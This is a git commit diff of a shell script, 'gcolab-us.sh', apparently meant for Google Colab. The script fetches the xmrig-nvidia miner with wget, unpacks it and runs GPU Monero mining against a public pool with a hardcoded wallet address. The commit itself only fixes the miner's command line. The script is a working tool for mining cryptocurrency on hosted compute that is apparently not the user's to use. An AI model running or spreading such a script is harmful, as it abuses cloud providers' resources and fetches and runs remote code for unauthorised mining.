4f0e3a65dc92d541de7efc19858ffd281b7ea88b
SHAWON553 <104970948+SHAWON553@users.noreply.github.com>
2022-08-26 10:47:54 +0600

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig-nvidia/archive/refs/tags/v2.14.5.tar.gz
 tar xvzf xmrig-nvidia-2.14.5.tar.gz
 cd xmrig-2.14.5
-./xmrig xmrig.exe --donate-level 5 --cuda -o pool.supportxmr.com:443 -u 4AmkCSg7SAPKvKNuzygrvQSX7Qzi5UP6nJXKSR3h3ptadaumfctokpMKqv3E6bMNKVEsDfwwVXmqHcGZpVBZDk5MBetLS4P -k --tls -p simon
+./xmrig --donate-level 5 --cuda -o pool.supportxmr.com:443 -u 4AmkCSg7SAPKvKNuzygrvQSX7Qzi5UP6nJXKSR3h3ptadaumfctokpMKqv3E6bMNKVEsDfwwVXmqHcGZpVBZDk5MBetLS4P -k --tls -p simon
